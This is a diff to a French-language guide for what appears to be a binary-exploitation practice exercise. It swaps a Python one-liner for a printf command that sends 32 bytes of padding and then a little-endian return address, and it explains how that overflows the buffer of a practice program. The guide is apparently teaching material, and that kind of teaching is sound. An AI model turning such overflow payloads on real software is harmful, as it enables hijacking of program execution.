@@ -56,11 +56,16 @@ Lister les symboles (utile pour les niveaux 3 et 4) :
 nm ./appel | grep secret
 ```
 
-Envoyer une charge construite en Python :
+Envoyer une charge (remplissage + octets bruts) avec `printf` — pas besoin de
+python. `\xNN` insère l'octet de valeur `NN` (en petit-boutisme pour une
+adresse) :
 
 ```sh
-python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40)' | ./secret
+printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9f\x91\x04\x08' | ./appel
 ```
+
+Ici : 32 octets `A` pour remplir le tampon, puis l'adresse `0x0804919f` écrite
+octet par octet à l'envers (`\x9f\x91\x04\x08`).
 
 ## Protections
 
